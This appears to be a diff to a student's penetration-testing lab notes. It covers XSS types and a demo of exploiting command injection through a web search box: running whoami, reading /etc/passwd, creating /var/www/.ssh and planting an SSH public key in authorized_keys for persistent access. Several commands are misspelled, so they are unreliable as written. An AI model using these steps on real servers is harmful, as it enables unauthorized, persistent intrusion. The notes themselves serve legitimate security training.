@@ -42,3 +42,16 @@ sudo apt install nikto -y
     Not stored, run JS on website, changes url, bad code in url
 #### Stored XSS
     Actually stored on server
+
+### Demo
+    lin-ops> ssh-keyget -t rsa "enter", "enter" is in /home/student/.ssh/id_rsa"
+    passhprhase -> blank
+    have genterated key
+    cd ~/.ssh 
+    ca id_rsa.pub(lic key) "generated public key"
+    in search box
+        : whoami -> www-data
+        : cat /etc/passswd -> home dir is /var/www
+        : ls -la /var/www -> see if .ssh file is created
+        : mksir /var/www/.ssh
+        : echo "ssh-rsa 'key' student@lin-ops" > /var/www/.ssh/authorized_keys
